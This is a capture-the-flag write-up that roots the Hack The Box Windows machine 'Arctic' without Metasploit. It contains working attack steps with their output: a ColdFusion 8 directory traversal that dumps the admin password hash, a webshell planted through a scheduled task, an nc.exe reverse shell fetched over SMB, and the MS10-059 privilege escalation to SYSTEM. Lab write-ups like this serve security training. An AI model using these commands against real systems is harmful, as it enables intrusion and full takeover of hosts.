---
title: Hack The Box - Arctic (Without Metasploit)
date: 2021-01-16 18:46:00 +0800
categories: [hackthebox]
tags: [windows, coldfusion, ms10-059]
image:
    path: /assets/images/arctic.png
---

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.11 arctic.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ rustscan --accessible -a arctic.htb -r 1-65535 -- -sT -sV -sC -Pn
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.11:135
Open 10.10.10.11:8500
Open 10.10.10.11:49154
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-16 06:21 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:21
Completed NSE at 06:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:21
Completed NSE at 06:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:21
Completed NSE at 06:21, 0.00s elapsed
Initiating Connect Scan at 06:21
Scanning arctic.htb (10.10.10.11) [3 ports]
Discovered open port 135/tcp on 10.10.10.11
Discovered open port 49154/tcp on 10.10.10.11
Discovered open port 8500/tcp on 10.10.10.11
Completed Connect Scan at 06:21, 0.01s elapsed (3 total ports)
Initiating Service scan at 06:21
Scanning 3 services on arctic.htb (10.10.10.11)
Completed Service scan at 06:23, 143.58s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.11.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:23
Completed NSE at 06:23, 14.03s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:23
Completed NSE at 06:23, 1.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:23
Completed NSE at 06:23, 0.00s elapsed
Nmap scan report for arctic.htb (10.10.10.11)
Host is up, received user-set (0.0053s latency).
Scanned at 2021-01-16 06:21:21 UTC for 158s

PORT      STATE SERVICE REASON  VERSION
135/tcp   open  msrpc   syn-ack Microsoft Windows RPC
8500/tcp  open  fmtp?   syn-ack
49154/tcp open  msrpc   syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:23
Completed NSE at 06:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:23
Completed NSE at 06:23, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:23
Completed NSE at 06:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.05 seconds
```

# Enumeration (1)

## Port 8500 `ColdFusion`

![](/assets/images/arctic1.png)

We are presented with a directory listing with 2 entries. We then come across with a `Adobe ColdFusion 8` login page on `http://arctic.htb:8500/CFIDE/administrator/`

![](/assets/images/arctic2.png)

Using `searchsploit`, we see that `Adobe ColdFusion` has a directory traversal vulnerability.

```bash
$ searchsploit Adobe ColdFusion 
--------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                             |  Path
--------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                        | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                     | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                        | multiple/remote/16985.rb
...
```

# Exploitation (1)

After copying the script, we are able to dump out the password hash of admin's password.

```bash
$ python 14641.py arctic.htb 8500 "../../../../../../../../ColdFusion8/lib/password.properties"  
------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
...
```

Using `crackstation`, we are able to crack the `SHA1` hash.

![](/assets/images/arctic3.png)

With the password, we can login.

![](/assets/images/arctic4.png)

To obtain a foothold, we need to see what directory this web application is running from. We can do this by going to `Server Settings` > `Mappings`.

![](/assets/images/arctic5.png)

Here, we take note that the directory path is `C:\ColdFusion8\wwwroot\CFIDE`.

Then, we go to `Debugging & Logging` > `Scheduled Tasks` and click on `Schedule New Task`. We then configure it with the following details. Note that for the time, we will need to follow `UTC` time. Make sure to include some leeway for setting up the web server and letting the scheduled task run.

![](/assets/images/arctic6.png)

After that is done, immediately start a web server with `http.server` or `updog` on port `80` and make sure that the [cfexec.cfm](https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/web-backdoors/cfm/cfExec.cfm) is being hosted.

Subsequently, the `cfexec.cfm` will be downloaded and saved at `/CFIDE/cfexec.cfm`. We can then access it and we will see a webshell.

![](/assets/images/arctic7.png)

Now, lets upgrade to a reverse shell.

We first setup a `SMB` server with `smbserver.py` and make sure that `nc.exe` is being shared.

```bash
$ mkdir share
$ cd share
$ cp /usr/share/windows-resources/binaries/nc.exe .
$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .                       
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

We then setup our `nc` listener

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
```

And then enter the following parameters into the webshell and hit `Exec`.

```
Command: \\10.10.XX.XX\kali\nc.exe
Options: -e cmd.exe 10.10.XX.XX 1337
```

After a while, we will receive a shell as `tolis`.

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.11] 49354
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

# user.txt

The user flag is in `tolis`'s Desktop.

```
C:\ColdFusion8\runtime\bin> type C:\Users\tolis\Desktop\user.txt
0265XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Enumeration (2)

Lets use [`Windows-Exploit-Suggester`](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) and see what exploits are available.

```bash
$ python windows-exploit-suggester.py --database 2021-01-16-mssb.xls --systeminfo ~/Desktop/htb/arctic/systeminfo
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

I will be using `MS10-059` and there's even a [compiled executable](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe) for it, ready to use.

# Exploitation (2)

After transferring over `MS10-059.exe`, we will need to setup another `nc` listener.

```bash
$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
```

And then we can execute the kernel exploit to get a shell as `SYSTEM`!

```
C:\tmp> MS10-059.exe 10.10.XX.XX 1337
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
```

```bash
$ rlwrap nc -lvnp 1337  
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.11] 49831
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\tmp> whoami
whoami
nt authority\system
```

# root.txt

The root flag is in `Administrator`'s Desktop.

```
C:\tmp> type C:\Users\Administrator\Desktop\root.txt
ce65XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !